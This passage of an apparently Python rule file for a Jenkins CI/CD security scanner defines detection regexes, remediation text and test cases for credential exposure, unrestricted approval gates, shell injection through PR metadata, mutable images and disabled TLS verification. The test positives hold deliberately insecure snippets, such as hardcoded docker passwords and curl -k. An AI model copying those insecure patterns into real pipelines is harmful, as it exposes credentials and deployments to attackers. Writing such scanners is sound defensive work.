            "Declarative pipelines: use the stage-level `input {}` directive — it "
            "blocks promotion into the stage until an approver acts, and its "
            "`submitter` field lists the approver user IDs and/or external group "
            "names (comma-separated). Jenkins administrators can always approve "
            "regardless:\n"
            "\n"
            "stage('Deploy to Production') {\n"
            "    input {\n"
            "        message 'Deploy to production?'\n"
            "        ok 'Deploy'\n"
            "        submitter 'release-approvers'\n"
            "    }\n"
            "    steps {\n"
            "        sh './deploy.sh prod'\n"
            "    }\n"
            "}\n"
            "\n"
            "Scripted pipelines (or when the approval must sit inside `steps {}`): "
            "use the input step directly:\n"
            "\n"
            "  input message: 'Deploy to production?', ok: 'Deploy', submitter: 'release-approvers'\n"
            "\n"
            "Add a timeout to auto-abort unreviewed deployments so a dangling "
            "input does not pin a runner forever:\n"
            "  timeout(time: 1, unit: 'HOURS') { input 'Deploy?' }"
        ),
        reference="https://www.jenkins.io/doc/pipeline/steps/pipeline-input-step/",
        test_positive=[
            "stage('Deploy to Production') {\n  steps {\n    sh './deploy.sh prod'\n  }\n}",
            "stage('Release to Live') {\n  steps {\n    sh './release.sh'\n  }\n}",
            "stage('Prod Deploy') {\n  steps {\n    sh './deploy.sh'\n  }\n}",
        ],
        test_negative=[
            "stage('Deploy to Production') {\n  steps {\n    input 'Approve?'\n    sh './deploy.sh prod'\n  }\n}",
            "stage('Build') {\n  steps {\n    sh 'make build'\n  }\n}",
        ],
        stride=["E", "T"],
        threat_narrative=(
            "Without a manual approval gate, any automated pipeline trigger — including a "
            "push from an attacker who has compromised a branch or merged a malicious PR — "
            "can execute production deployment commands with no human review. A compromised "
            "commit reaching the deploy stage has full access to production infrastructure "
            "via the Jenkins agent's credentials."
        ),
    ),
    # =========================================================================
    # SEC9-JK-002: archiveArtifacts without fingerprinting
    # =========================================================================
    Rule(
        id="SEC9-JK-002",
        title="archiveArtifacts called without fingerprint: true",
        severity=Severity.LOW,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-9",
        description=(
            "A Jenkins pipeline archives build artifacts without enabling "
            "`fingerprint: true`. Fingerprinting records an MD5 hash of each "
            "archived artifact in Jenkins, creating a traceable record of which "
            "build produced which binary. Without fingerprinting, there is no "
            "built-in way to verify that a deployed artifact matches what was "
            "produced by a specific build — an attacker who replaces an artifact "
            "between archiving and deployment cannot be detected through Jenkins logs."
        ),
        pattern=SequencePattern(
            pattern_a=r"\barchiveArtifacts\b",
            absent_within=r"fingerprint\s*:\s*true",
            lookahead_lines=5,
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Enable Jenkins fingerprinting so Jenkins records an MD5 of every "
            "archived artefact for cross-build traceability:\n"
            "\n"
            "// Before\n"
            "archiveArtifacts artifacts: 'dist/**/*.jar'\n"
            "\n"
            "// After\n"
            "archiveArtifacts artifacts: 'dist/**/*.jar', fingerprint: true\n"
            "\n"
            "Note: Jenkins fingerprints are MD5 and are intended for traceability "
            "(which build produced which file), not tamper-evidence. For "
            "cryptographic integrity, also generate and archive a SHA256 checksum "
            "manifest alongside the artefacts — and sign it if you have a signing "
            "key available:\n"
            "\n"
            "sh 'sha256sum dist/**/*.jar > dist/SHA256SUMS'\n"
            "archiveArtifacts artifacts: 'dist/**', fingerprint: true"
        ),
        reference="https://www.jenkins.io/doc/pipeline/steps/core/#archiveartifacts-archive-the-artifacts",
        test_positive=[
            "archiveArtifacts artifacts: 'dist/**'",
            "archiveArtifacts 'target/*.jar'",
            "archiveArtifacts(artifacts: 'build/**', fingerprint: false)",
        ],
        test_negative=[
            "archiveArtifacts artifacts: 'dist/**', fingerprint: true",
            "// archiveArtifacts 'target/*.jar'",
        ],
        stride=["R", "T"],
        threat_narrative=(
            "Without fingerprinting, there is no record in Jenkins of which build "
            "produced which archived binary, making it impossible to trace an "
            "artefact back to its origin build. Jenkins fingerprints (MD5) cover "
            "the traceability case — they are not cryptographic tamper evidence, "
            "but they are the minimum evidence chain Jenkins itself can provide "
            "for supply chain forensics."
        ),
    ),
    # =========================================================================
    # SEC2-JK-001: Credentials stored in build parameters
    # =========================================================================
    Rule(
        id="SEC2-JK-001",
        title="Credential stored as build parameter instead of Jenkins credential store",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-2",
        description=(
            "A Jenkins pipeline defines a `password` type build parameter. "
            "Password parameters are stored in the Jenkins job configuration as "
            "plain text (or weakly encrypted), visible in the build history, "
            "accessible via the Jenkins API to anyone with read access to the job, "
            "and logged in the parameter list for each build. "
            "Jenkins Credentials Binding is specifically designed for this purpose "
            "and provides proper encryption, access control, and audit logging. "
            "Use `string(credentialsId: '...')` or `usernamePassword(...)` bindings "
            "instead of password parameters."
        ),
        pattern=RegexPattern(
            match=r"\bpassword\s*\(\s*name\s*:",
            exclude=[r"^\s*//", r"usernamePassword\s*\("],
        ),
        remediation=(
            "Replace password parameters with Jenkins credential bindings:\n\n"
            "// BAD — parameter stored in job config, visible in build history\n"
            "parameters {\n"
            "    password(name: 'API_TOKEN', defaultValue: '', description: 'Token')\n"
            "}\n\n"
            "// GOOD — credential stored in Jenkins credential store\n"
            "withCredentials([string(credentialsId: 'my-api-token', variable: 'API_TOKEN')]) {\n"
            "    sh 'curl -H \"Authorization: Bearer $API_TOKEN\" https://api.example.com'\n"
            "}\n\n"
            "Add the credential via: Manage Jenkins → Credentials → System → "
            "Global credentials (unrestricted) → Add Credentials."
        ),
        reference="https://www.jenkins.io/doc/book/using/using-credentials/",
        test_positive=[
            "parameters {\n    password(name: 'SECRET', defaultValue: '', description: 'API secret')\n}",
            "password(name: 'DEPLOY_TOKEN', defaultValue: '')",
        ],
        test_negative=[
            "withCredentials([string(credentialsId: 'my-token', variable: 'TOKEN')])",
            "// password(name: 'SECRET', defaultValue: '')",
            "usernamePassword(credentialsId: 'creds', usernameVariable: 'USER', passwordVariable: 'PASS')",
        ],
        stride=["I"],
        threat_narrative=(
            "Password-type build parameters are stored as plain text in the Jenkins job "
            "configuration, visible in build history via the Jenkins API to anyone with "
            "read access to the job. Unlike Jenkins credentials, build parameters are not "
            "masked in logs and are exposed in the parameter list for every build run."
        ),
    ),
    # =========================================================================
    # SEC2-JK-002: credentialsId bound from user-controlled build parameter
    # =========================================================================
    Rule(
        id="SEC2-JK-002",
        title="credentialsId bound from user-controlled build parameter — attacker selects credential",
        severity=Severity.CRITICAL,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-2",
        description=(
            "A Jenkins pipeline uses a value from params.* as the credentialsId argument "
            "in a withCredentials() binding. This lets anyone who can trigger the build "
            "specify which credential from the Jenkins store is bound — including highly "
            "privileged credentials (production deploy keys, admin API tokens). "
            "By setting the parameter to a known credential ID and running a step that "
            "echoes or exfiltrates the bound variable, an attacker can extract any "
            "credential they know the ID of."
        ),
        pattern=RegexPattern(
            match=r"credentialsId\s*:\s*params\.",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Never derive credentialsId from user-controlled parameters. Hardcode or "
            "validate against a strict allowlist:\n\n"
            "// BAD\n"
            "withCredentials([string(credentialsId: params.CRED_ID, variable: 'TOKEN')]) { ... }\n\n"
            "// GOOD — hardcoded ID\n"
            "withCredentials([string(credentialsId: 'production-api-token', variable: 'TOKEN')]) { ... }\n\n"
            "// ACCEPTABLE — strict allowlist\n"
            "def ALLOWED = ['staging-token', 'dev-token']\n"
            "if (!ALLOWED.contains(params.CRED_ID)) { error 'Unauthorized credential' }\n"
            "withCredentials([string(credentialsId: params.CRED_ID, variable: 'TOKEN')]) { ... }"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#handling-credentials",
        test_positive=[
            "withCredentials([string(credentialsId: params.CREDENTIAL_ID, variable: 'TOKEN')]) {\n    sh './deploy.sh'\n}",
            "withCredentials([usernamePassword(credentialsId: params.CREDS, usernameVariable: 'U', passwordVariable: 'P')]) { sh 'docker login' }",
        ],
        test_negative=[
            "withCredentials([string(credentialsId: 'my-api-token', variable: 'TOKEN')]) { sh './deploy.sh' }",
            "// credentialsId: params.CREDENTIAL_ID",
        ],
        stride=["E", "I"],
        threat_narrative=(
            "Binding a credentialsId from a user-controlled build parameter allows any user "
            "with build trigger access to specify which credential Jenkins retrieves and "
            "binds to the build environment — effectively granting access to arbitrary "
            "credentials in the Jenkins store. An attacker can enumerate available "
            "credential IDs and extract secrets they are not authorized to use by "
            "triggering builds with crafted parameter values."
        ),
    ),
    # =========================================================================
    # SEC2-JK-003: hardcoded credentials in a ``docker login`` or
    # ``docker run -e *_PASSWORD=<literal>`` shell step.  Jenkins port of
    # SEC2-GH-004 — but the attack surface looks different on Jenkins
    # because there's no ``container:``/``services:`` block.  Credentials
    # typically reach a Jenkinsfile via one of two insecure shapes:
    #   (1) ``sh 'docker login -u user -p <literal>'`` in a stage step
    #   (2) ``sh 'docker run -e POSTGRES_PASSWORD=<literal> ...'`` for
    #       a sidecar container spawned from a shell step.
    # The safe form is ``withCredentials`` from the Jenkins credential
    # store, which binds the secret into an env var at runtime and does
    # not appear in the Jenkinsfile.
    # =========================================================================
    Rule(
        id="SEC2-JK-003",
        title="Hardcoded credentials in Jenkinsfile docker / service shell step",
        severity=Severity.CRITICAL,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-2",
        description=(
            "A shell step in a Jenkinsfile passes a credential as a "
            "literal string on the command line — either as ``docker "
            "login -u <user> -p <password>`` or as ``docker run -e "
            "*_PASSWORD=<literal>`` for a sidecar container.  Literal "
            "credentials in a Jenkinsfile are readable by anyone with "
            "SCM read access, echoed in Jenkins build logs when the "
            "shell line executes, and permanently preserved in git "
            "history.  The safe form is ``withCredentials`` bound to "
            "an entry in the Jenkins credential store — the literal "
            "never touches the Jenkinsfile, and Jenkins masks the "
            "bound variable in log output."
        ),
        pattern=RegexPattern(
            # Two insecure shapes in one alternation:
            #
            #  (a) docker login -u user -p <literal>
            #      Excludes: values that are `$VAR`, `"${...}"`, or
            #      `\$VAR` (escaped so Groovy doesn't interpolate
            #      before `sh` runs).
            #
            #  (b) docker run [...] -e KEY_PASSWORD=<literal>
            #      Targets the same *_PASSWORD / *_PASS / *_TOKEN
            #      suffix family as SEC2-GL-003 so the two rules tell
            #      the same story on the same attack class.
            match=(
                r"(?:"
                # docker login with literal -p value
                r"\bdocker\s+login\b[^\n]*?"
                r"(?:-p|--password(?:-stdin)?)\s+"
                r"['\"]?(?![\$\\])[^\s'\"`]{3,}"
                r"|"
                # docker run with literal -e KEY_PASSWORD=...
                r"\bdocker\s+run\b[^\n]*?"
                r"-e\s+['\"]?(?:[A-Z][A-Z0-9_]*_(?:PASSWORD|PASS|TOKEN|SECRET))"
                r"=(?![\$\\])[^\s'\"`]{3,}"
                r")"
            ),
            exclude=[
                r"^\s*//",
                r"^\s*\*",
                r"^\s*#",
                # Paired with --password-stdin and a piped value is the
                # safe shape even though it matches the login prefix.
                r"--password-stdin\b",
            ],
        ),
        remediation=(
            "Bind credentials from the Jenkins store with\n"
            "``withCredentials`` — the secret is injected into an env\n"
            "var at runtime, masked in log output, and never written\n"
            "into the Jenkinsfile.\n\n"
            "// BAD\n"
            "sh 'docker login -u ci-bot -p hunter2 registry.example.com'\n\n"
            "// GOOD — credential store + env reference\n"
            "withCredentials([usernamePassword(\n"
            "        credentialsId: 'registry-creds',\n"
            "        usernameVariable: 'REG_USER',\n"
            "        passwordVariable: 'REG_PASS')]) {\n"
            '    sh \'echo "$REG_PASS" | docker login -u "$REG_USER" --password-stdin registry.example.com\'\n'
            "}\n\n"
            "// BAD\n"
            "sh 'docker run -e POSTGRES_PASSWORD=hardcoded_pass postgres:15'\n\n"
            "// GOOD — credential bound into the job's env\n"
            "withCredentials([string(credentialsId: 'pg-pass',\n"
            "                        variable: 'POSTGRES_PASSWORD')]) {\n"
            "    sh 'docker run -e POSTGRES_PASSWORD=\"$POSTGRES_PASSWORD\" postgres:15'\n"
            "}"
        ),
        reference=("https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#handling-credentials"),
        test_positive=[
            # docker login with literal password
            "sh 'docker login -u ci-bot -p hunter2 registry.example.com'",
            'sh "docker login --password myrealpass -u deploy registry"',
            # docker run with literal -e PASSWORD
            "sh 'docker run -e POSTGRES_PASSWORD=literalvalue postgres:15'",
            'sh """docker run -d -e MYSQL_PASSWORD=rootpw mysql:8"""',
            # TOKEN form
            "sh 'docker run -e API_TOKEN=real-token-here myimage'",
        ],
        test_negative=[
            # Password piped through stdin — safe canonical form.
            "sh 'echo \"$REG_PASS\" | docker login -u ci-bot --password-stdin registry.example.com'",
            # withCredentials-bound env var — safe, shell sees `$VAR`.
            'sh \'docker login -u "$REG_USER" -p "$REG_PASS" registry.example.com\'',
            # Escaped variable — Groovy leaves literal `$VAR` for the shell.
            'sh "docker run -e POSTGRES_PASSWORD=\\$POSTGRES_PASSWORD postgres:15"',
            # Comments
            "// sh 'docker login -u bot -p secret registry'",
            "# docker run -e PASSWORD=x",
            # Unrelated docker run without a password literal
            "sh 'docker run --rm alpine:3 echo hello'",
        ],
        stride=["I", "E"],
        threat_narrative=(
            "A literal credential on a Jenkins ``sh`` line is readable "
            "by anyone with SCM access and is printed to the build log "
            "when the shell line executes (Jenkins has no way to mask "
            "a value it wasn't told is a secret).  Build logs on a "
            "public Jenkins controller, or one behind SSO with broad "
            "viewing permissions, are a lateral-movement primitive: "
            "an attacker who lands on any account with view-logs "
            "access extracts the credential and reuses it against "
            "whatever service it authenticates to."
        ),
    ),
    # =========================================================================
    # SEC4-JK-004: input step without submitter restriction
    # =========================================================================
    Rule(
        id="SEC4-JK-004",
        title="Jenkins input step without submitter restriction — any user can approve",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A Jenkins pipeline uses an input step for manual approval but does not "
            "specify the 'submitter' parameter. Without submitter, any authenticated "
            "Jenkins user can approve the gate — including developers with read-only "
            "access to the job. For production deployments this means the approval "
            "provides no assurance that a qualified person reviewed the change. "
            "An attacker with any Jenkins login could approve their own malicious deployment."
        ),
        pattern=SequencePattern(
            pattern_a=r"\binput\b\s*(?:message\s*:|[('\"])",
            absent_within=r"\bsubmitter\s*:",
            lookahead_lines=5,
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Restrict approvals to a named group or user:\n\n"
            "input {\n"
            "    message 'Deploy to production?'\n"
            "    ok 'Deploy'\n"
            "    submitter 'release-team,ops-leads'   // comma-separated user IDs or groups\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/pipeline/steps/pipeline-input-step/",
        test_positive=[
            "input message: 'Deploy?', ok: 'Deploy'",
            "input('Ready to deploy to production?')",
        ],
        test_negative=[
            "input message: 'Deploy?', submitter: 'release-team', ok: 'Deploy'",
            "// input message: 'Deploy?'",
        ],
        stride=["S", "E"],
        threat_narrative=(
            "An input step without a submitter restriction allows any Jenkins user — "
            "including those with only read access — to approve a production deployment by "
            "clicking 'Proceed'. Legitimate approval gates depend on submitter restriction "
            "to enforce that only designated release managers or change approvers can "
            "authorize deployments."
        ),
    ),
    # =========================================================================
    # SEC4-JK-005: Additional PR author/URL env vars used in shell
    # =========================================================================
    Rule(
        id="SEC4-JK-005",
        title="PR author or URL environment variable used in shell — attacker-controlled content",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A Jenkins pipeline interpolates CHANGE_AUTHOR_EMAIL, CHANGE_AUTHOR_DISPLAY_NAME, "
            "CHANGE_URL, GIT_COMMITTER_NAME, or GIT_COMMITTER_EMAIL into a shell command. "
            "These are populated from pull request metadata and are entirely attacker-controlled. "
            "A crafted display name or email containing shell metacharacters enables command "
            "injection. SEC4-JK-002 covers GIT_BRANCH, BRANCH_NAME, CHANGE_BRANCH, "
            "CHANGE_TITLE, and CHANGE_AUTHOR; this rule covers the remaining PR author fields."
        ),
        pattern=RegexPattern(
            match=(
                r'sh\s+["\'].*\$\{?env\.'
                r"(?:CHANGE_AUTHOR_EMAIL|CHANGE_AUTHOR_DISPLAY_NAME|CHANGE_URL"
                r"|GIT_COMMITTER_NAME|GIT_COMMITTER_EMAIL)\b"
            ),
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Pass PR metadata through environment variables and validate before use:\n\n"
            "// BAD\n"
            'sh "git config user.email ${env.CHANGE_AUTHOR_EMAIL}"\n\n'
            "// GOOD\n"
            'withEnv(["AUTHOR_EMAIL=${env.CHANGE_AUTHOR_EMAIL}"]) {\n'
            "    sh '''\n"
            "        echo \"$AUTHOR_EMAIL\" | grep -qE '^[^@]+@[^@]+$' || exit 1\n"
            '        git config user.email "$AUTHOR_EMAIL"\n'
            "    '''\n"
            "}"
        ),
        reference="https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution",
        test_positive=[
            'sh "git config user.email ${env.CHANGE_AUTHOR_EMAIL}"',
            "sh \"notify.sh '${env.CHANGE_AUTHOR_DISPLAY_NAME}'\"",
            "sh \"curl -d 'url=${env.CHANGE_URL}' https://tracker.example.com\"",
        ],
        test_negative=[
            'sh "echo Build: ${env.BUILD_NUMBER}"',
            "sh 'git config user.email ci@example.com'",
            '// sh "git config user.email ${env.CHANGE_AUTHOR_EMAIL}"',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "CHANGE_TITLE, CHANGE_AUTHOR, and related PR-derived variables are populated "
            "from user-controlled PR metadata and can contain shell metacharacters. When "
            "used in Groovy GString interpolation inside a sh() call, a contributor who "
            "controls the PR title or description can inject shell commands that run with "
            "the pipeline's agent permissions."
        ),
    ),
    # =========================================================================
    # SEC5-JK-001: Deploy stage without disableConcurrentBuilds
    # =========================================================================
    Rule(
        id="SEC5-JK-001",
        title="Pipeline with deploy stage lacks disableConcurrentBuilds — concurrent deployment race",
        severity=Severity.MEDIUM,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-5",
        description=(
            "A Jenkins pipeline contains a deployment stage but does not use "
            "disableConcurrentBuilds() in the options block. Without this, multiple "
            "simultaneous pipeline runs can execute deployment stages in parallel against "
            "the same target environment, causing race conditions or one run overwriting "
            "the state established by another. This is the Jenkins equivalent of "
            "GitLab's resource_group: feature."
        ),
        pattern=ContextPattern(
            anchor=r"stage\s*\(['\"].*(?:[Dd]eploy|[Pp]roduct|[Rr]elease|[Ll]ive)[^'\"]*['\"]",
            requires=r"stage\s*\(['\"].*(?:[Dd]eploy|[Pp]roduct|[Rr]elease|[Ll]ive)",
            requires_absent=r"\bdisableConcurrentBuilds\s*\(",
            scope="file",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Add disableConcurrentBuilds to the pipeline options block:\n\n"
            "pipeline {\n"
            "    options {\n"
            "        disableConcurrentBuilds(abortPrevious: true)\n"
            "    }\n"
            "    ...\n"
            "    stage('Deploy to Production') { ... }\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/syntax/#options",
        test_positive=[
            "pipeline {\n  stages {\n    stage('Deploy to Production') {\n      steps { sh './deploy.sh' }\n    }\n  }\n}",
            "stage('Release to Live') {\n  steps { sh './release.sh' }\n}",
        ],
        test_negative=[
            "pipeline {\n  options { disableConcurrentBuilds() }\n  stages {\n    stage('Deploy to Production') { steps { sh './deploy.sh' } }\n  }\n}",
            "stage('Build') {\n  steps { sh 'make' }\n}",
        ],
        stride=["T", "D"],
        threat_narrative=(
            "Without disableConcurrentBuilds, multiple pipeline runs triggered in rapid "
            "succession can execute deployment stages simultaneously against the same "
            "environment, causing race conditions where one deployment overwrites the other "
            "or leaves infrastructure in an inconsistent state. This is especially "
            "dangerous for database migrations or infrastructure provisioning."
        ),
    ),
    # =========================================================================
    # SEC3-JK-003: docker.image().inside() with mutable tag
    # =========================================================================
    Rule(
        id="SEC3-JK-003",
        title="docker.image().inside() uses mutable :latest or untagged image",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-3",
        description=(
            "A Jenkins pipeline calls docker.image().inside() with a Docker image "
            "referenced by ':latest' or no tag. The image becomes the execution "
            "environment for all commands inside the block, with access to bound "
            "credentials, workspace contents, and environment variables. A compromised "
            "upstream ':latest' gives an attacker arbitrary code execution inside the "
            "build environment. This is distinct from SEC8-JK-001 which covers "
            "`agent { docker { image '...' } }` — this rule covers the pipeline step pattern."
        ),
        pattern=RegexPattern(
            match=(
                r"docker\.image\s*\(\s*['\"]"
                r"(?:[a-zA-Z0-9][^@'\"]*:latest|[a-zA-Z0-9][a-zA-Z0-9._\-/]+)"
                r"['\"]"
            ),
            exclude=[
                r"^\s*//",
                r"@sha256:",
                r":(?!latest)[a-zA-Z0-9]",
            ],
        ),
        remediation=(
            "Pin the image to a SHA256 digest:\n\n"
            "// BAD\n"
            "docker.image('ubuntu:latest').inside { sh 'make test' }\n\n"
            "// GOOD\n"
            "docker.image('ubuntu@sha256:abc123...').inside { sh 'make test' }"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/docker/",
        test_positive=[
            "docker.image('ubuntu:latest').inside { sh 'make test' }",
            "docker.image('python:latest').inside { sh 'pytest' }",
            "docker.image('node').inside { sh 'npm test' }",
        ],
        test_negative=[
            "docker.image('ubuntu:22.04').inside { sh 'make test' }",
            "docker.image('ubuntu@sha256:abc123').inside { sh 'make' }",
            "// docker.image('ubuntu:latest').inside { sh 'make' }",
        ],
        stride=["T"],
        threat_narrative=(
            "docker.image().inside() with a mutable :latest or untagged reference changes "
            "the execution environment silently with every upstream registry push. The "
            "container executes all pipeline commands with access to the workspace, bound "
            "credentials, and environment variables — a compromised image has full build "
            "access."
        ),
    ),
    # =========================================================================
    # SEC6-JK-004: TLS certificate verification disabled in shell step
    # =========================================================================
    Rule(
        id="SEC6-JK-004",
        finding_family="insecure_transport",
        title="TLS certificate verification disabled in shell step",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        description=(
            "A Jenkins pipeline shell step runs curl with -k/--insecure or wget with "
            "--no-check-certificate, disabling TLS certificate verification. This allows "
            "man-in-the-middle attacks: an attacker on the network path can intercept "
            "the connection, serve a forged certificate, and inject malicious content "
            "into the response — including malicious scripts, forged artifacts, or "
            "false API responses that compromise the build or deployment."
        ),
        pattern=RegexPattern(
            match=r"(?:curl\b[^\n]*(?:\s-k\b|\s--insecure\b)|wget\b[^\n]*\s--no-check-certificate\b)",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Fix the underlying certificate issue rather than disabling verification:\n\n"
            "// BAD\n"
            "sh 'curl -k https://internal.example.com/api'\n\n"
            "// GOOD — add CA cert to trust store\n"
            "sh 'curl --cacert /etc/ssl/certs/internal-ca.pem https://internal.example.com/api'"
        ),
        reference="https://owasp.org/www-project-top-10-ci-cd-security-risks/",
        test_positive=[
            "sh 'curl -k https://internal.example.com/data'",
            "sh 'curl --insecure https://api.example.com/endpoint'",
            "sh 'wget --no-check-certificate https://example.com/file.tar.gz'",
        ],
        test_negative=[
            "sh 'curl https://example.com/data'",
            "sh 'curl --cacert /etc/ssl/ca.pem https://internal.example.com'",
            "// sh 'curl -k https://example.com'",
        ],
        stride=["I", "T"],
        threat_narrative=(
            "Disabling TLS certificate verification removes the cryptographic guarantee "
            "that the server you are communicating with is authentic, opening the "
            "connection to MITM attacks that can read credentials in transit and substitute "
            "malicious responses. Credentials sent over an unverified connection are "
            "effectively public."
        ),
    ),
    # =========================================================================
    # SEC6-JK-009 — HTTP Request plugin step disables TLS verification.
    # SEC6-JK-004 only catches ``curl -k`` / ``wget --no-check-certificate``
    # in a shell body.  The Jenkins HTTP Request plugin (``httpRequest``)
    # has its own knob, ``ignoreSslErrors: true``, which the shell-anchored
    # rule never sees.  We deliberately do NOT also match an http:// URL in
    # ``httpRequest``: a bare ``url: 'http://...'`` already fires SEC8-JK-003
    # (its matcher keys on ``url: 'http://'``), so matching it here would
    # double-fire.  ``ignoreSslErrors`` is httpRequest-specific → near-zero FP.
    # =========================================================================
    Rule(
        id="SEC6-JK-009",
        finding_family="insecure_transport",
        title="HTTP Request step disables TLS certificate verification (ignoreSslErrors)",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        description=(
            "A Jenkins ``httpRequest`` step (HTTP Request plugin) sets "
            "``ignoreSslErrors: true``, disabling TLS certificate verification "
            "for that request. This is the plugin-step analogue of ``curl -k`` "
            "(SEC6-JK-004, which only inspects shell bodies). An attacker on the "
            "network path can present a forged certificate and intercept the "
            "request — reading any credential or token sent in headers and "
            "substituting a malicious response body (forged artifact, false API "
            "result) that the pipeline then trusts."
        ),
        pattern=RegexPattern(
            match=r"ignoreSslErrors\s*:\s*[Tt]rue\b",
            exclude=[r"^\s*//", r"^\s*\*"],
        ),
        remediation=(
            "Fix the certificate trust instead of ignoring errors:\n\n"
            "// BAD\n"
            "httpRequest url: 'https://internal/api', ignoreSslErrors: true\n\n"
            "// GOOD — trust the internal CA on the agent / controller and drop\n"
            "// the flag so the certificate chain is validated.\n"
            "httpRequest url: 'https://internal/api'"
        ),
        reference="https://plugins.jenkins.io/http_request/",
        test_positive=[
            "httpRequest url: 'https://internal/api', ignoreSslErrors: true",
            "httpRequest(url: 'https://x/y',\n  ignoreSslErrors: true)",
        ],
        test_negative=[
            "httpRequest url: 'https://internal/api'",
            "httpRequest url: 'https://x/y', ignoreSslErrors: false",
            "// httpRequest url: 'https://x', ignoreSslErrors: true",
        ],
        stride=["I", "T"],
        threat_narrative=(
            "Ignoring SSL errors removes the guarantee that the responding host "
            "is authentic. A MITM serves a forged certificate, reads any "
            "Authorization header or token the step sends, and returns attacker "
            "content the pipeline then executes or deploys — credentials in "
            "transit are effectively public."
        ),
    ),
    # =========================================================================
    # SEC6-JK-005: Long-lived cloud credentials in environment block
    # =========================================================================
    Rule(
        id="SEC6-JK-005",
        title="Long-lived cloud credential in Jenkins environment block — use OIDC plugin instead",
        severity=Severity.MEDIUM,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        description=(
            "The pipeline environment block references long-lived cloud provider "
            "credentials (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, "
            "GOOGLE_APPLICATION_CREDENTIALS, AZURE_CLIENT_SECRET). These are static "
            "credentials that remain valid indefinitely — a leaked key gives "
            "persistent cloud access. Modern Jenkins setups exchange a short-lived "
            "OIDC token minted by Jenkins for temporary provider credentials. The "
            "AWS flavour uses the pipeline-aws plugin's `withAWS(role: ...)` for "
            "STS AssumeRole (optionally seeded with an OIDC token from the "
            "oidc-provider plugin); do NOT conflate this with the aws-credentials "
            "plugin, which only stores static access keys."
        ),
        pattern=RegexPattern(
            match=(
                r"(?i)(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY"
                r"|GOOGLE_APPLICATION_CREDENTIALS|GOOGLE_CREDENTIALS"
                r"|AZURE_CLIENT_SECRET|AZURE_CREDENTIALS)\s*="
            ),
            exclude=[r"^\s*//", r"\$\{env\.", r"\$\{"],
        ),
        remediation=(
            "Exchange a Jenkins-minted OIDC token for temporary provider "
            "credentials. For AWS, use the pipeline-aws plugin's `withAWS(role: ...)` "
            "to assume an IAM role; the role's trust policy should trust the "
            "Jenkins OIDC issuer (configured via the oidc-provider plugin) so the "
            "build never handles a long-lived key:\n"
            "\n"
            "// Requires: pipeline-aws plugin + oidc-provider plugin\n"
            "withAWS(role: 'arn:aws:iam::123456789012:role/ci-deploy',\n"
            '        roleSessionName: "jenkins-${env.BUILD_NUMBER}",\n'
            "        region: 'us-east-1') {\n"
            "    sh 'aws s3 sync dist/ s3://my-bucket/'\n"
            "}\n"
            "\n"
            "Plugin homepages:\n"
            "  - pipeline-aws (withAWS): https://plugins.jenkins.io/pipeline-aws/\n"
            "  - oidc-provider (mints OIDC tokens): https://plugins.jenkins.io/oidc-provider/\n"
            "\n"
            "The legacy aws-credentials plugin stores static access keys and is "
            "NOT the OIDC path — replace it with the combination above."
        ),
        reference="https://plugins.jenkins.io/pipeline-aws/",
        test_positive=[
            "environment {\n    AWS_ACCESS_KEY_ID = 'AKIAIOSFODNN7EXAMPLE'\n    AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG'\n}",
            "    GOOGLE_APPLICATION_CREDENTIALS = '/path/to/key.json'",
            "    AWS_ACCESS_KEY_ID = credentials('aws-access-key')",
        ],
        test_negative=[
            "    AWS_REGION = 'us-east-1'",
            "// GOOGLE_APPLICATION_CREDENTIALS = '/key.json'",
        ],
        stride=["I", "E"],
        threat_narrative=(
            "Cloud credentials bound in the environment block are scoped to the entire "
            "pipeline and injected as environment variables into every sh() step, "
            "widening the scope compared to withCredentials scoping. A leaked "
            "AWS_ACCESS_KEY_ID remains valid indefinitely — unlike OIDC tokens which expire "
            "within minutes of the build."
        ),
    ),
    # =========================================================================
    # SEC6-JK-006: writeFile writing private key or credential material
    # =========================================================================
    Rule(
        id="SEC6-JK-006",
        title="writeFile step writes private key or credential material to workspace",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        description=(
            "A Jenkins pipeline uses writeFile to write content containing a private key, "
            "certificate, or credential to the workspace. Workspace contents may persist "
            "between builds on permanent agents, be accessible to other pipelines on the "
            "same agent, and can be unintentionally archived if artifact glob patterns "
            "are too broad. Private key material written to disk should be deleted "
            "immediately after use and should never be archived."
        ),
        pattern=RegexPattern(
            match=r"writeFile\b.*(?:PRIVATE\s+KEY|id_rsa|\.pem|\.pfx|\.p12|BEGIN\s+(?:CERTIFICATE|EC|RSA|DSA))",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Use withCredentials sshUserPrivateKey binding — Jenkins manages the temp file:\n\n"
